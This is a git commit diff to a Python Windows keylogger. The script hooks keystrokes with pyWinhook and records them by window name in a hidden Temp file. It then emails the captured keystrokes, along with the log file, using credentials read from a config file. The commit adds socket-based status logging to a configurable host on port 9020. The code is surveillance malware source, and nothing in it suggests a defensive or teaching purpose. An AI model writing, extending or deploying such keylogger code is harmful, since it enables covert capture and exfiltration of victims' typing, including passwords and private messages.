6ee7a355b279315fb4b20f9e35704134223dccb8
tyamlak <tyamlak@gmail.com>
2021-03-25 00:54:57 +0300

    script sends program logs over sockets

--- keylogger.py
+++ keylogger.py
@@ -8,14 +8,18 @@ import pythoncom
 import pyWinhook as pyHook
 
 from utils import send_mail
+import logging, logging.handlers
 
+
+logging.lastResort.setLevel(logging.DEBUG)
 
 class KeyLogger:
 
     USER_NAME = getuser()
     APP_DIR = f'C:/Users/{USER_NAME}/AppData/Local/Temp'
 
-    def __init__(self,log_method=1,log_file='keylog.txt',debug=False,time_interval=1):
+    def __init__(self,log_method=1,log_file='keylog.txt',time_interval=1,
+                    debug=False,logging_host='localhost'):
         self.key_strokes = ""
         self.log_file = os.path.join(KeyLogger.APP_DIR,log_file)
         if os.path.exists(self.log_file):
@@ -31,6 +35,16 @@ class KeyLogger:
         elif log_method == 3:
             self.log_method = self.tweet_log
 
+        self.logger = self.get_log_handler(logging_host)
+
+    def get_log_handler(self,host):
+        logger = logging.getLogger('')
+        logger.setLevel(logging.DEBUG)
+        socket_handler = logging.handlers.SocketHandler(host,9020)
+        logger.addHandler(socket_handler)
+        
+        return logger
+
     def schedule_log(self):
         while True:
             time.sleep(self.time_interval)
@@ -44,7 +58,7 @@ class KeyLogger:
 
     def ListenKeyboard(self,event):
         if event.Key == 'Escape':
-            print("Writing logs and quitting...")
+            self.logger.info("Writing logs and quitting...")
             self.log()
             exit(0)
         if event.MessageName == 'key down':
@@ -64,7 +78,7 @@ class KeyLogger:
 
         self.timer.start()
 
-        print("Keylogger started.") # logging
+        self.logger.info("Keylogger started.")
         pythoncom.PumpMessages()
 
     def log(self,event=None):
@@ -75,8 +89,8 @@ class KeyLogger:
             self.keylog_data = []
             self.key_strokes = ""
         except Exception as e:
-            print('Error occured: ',e) # logging
-            print("Clearing log data...")
+            self.logger.error(f'{e}') 
+            self.logger.info("Clearing log data...")
             self.keylog_data = []
 
     def log_to_file(self,event=None,*args,**kwargs):
@@ -92,6 +106,7 @@ class KeyLogger:
             for keys in log_info:
                 f.write(f'Window Name: [{keys}]\n\t{log_info[keys]}\n')
             f.write('*'*30+'\n\n')
+        self.logger.info('Keylog saved successfully.')
 
     def tweet_log(self,*args,**kwargs):
         print("Tweeting keylogs: ",self.key_strokes)
@@ -99,20 +114,21 @@ class KeyLogger:
     def email_log(self,login_cred=None,*args,**kwargs):
         email = None
         password = None
-        print("Sending email logs...")
+        self.logger.info("Emailing key logs...")
         self.log_to_file()
         if login_cred is None:
-            if os.path.exists(os.path.join(KeyLogger.APP_DIR,'email.cfg')):
+            email_cfg_file = os.path.join(KeyLogger.APP_DIR,'email.cfg')
+            if os.path.exists(email_cfg_file):
                 config = configparser.ConfigParser()
-                config.read('email.cfg')
+                config.read(email_cfg_file)
                 email = config['LOGIN_CRED']['EMAIL']
                 password = config['LOGIN_CRED']['PASSWORD']
         else:
             email, password = login_cred
         send_mail(email,email,time.strftime('Keylogs for %c'),self.key_strokes,files=[self.log_file],creds=(email,password))
-        print('Email sent!')
+        self.logger.info('Email sent!')
         os.remove(self.log_file)
 
 if __name__ == "__main__":
-    keylogger = KeyLogger(log_method=2,time_interval=0.1)
+    keylogger = KeyLogger(log_method=1,time_interval=0.1)
     keylogger.run()
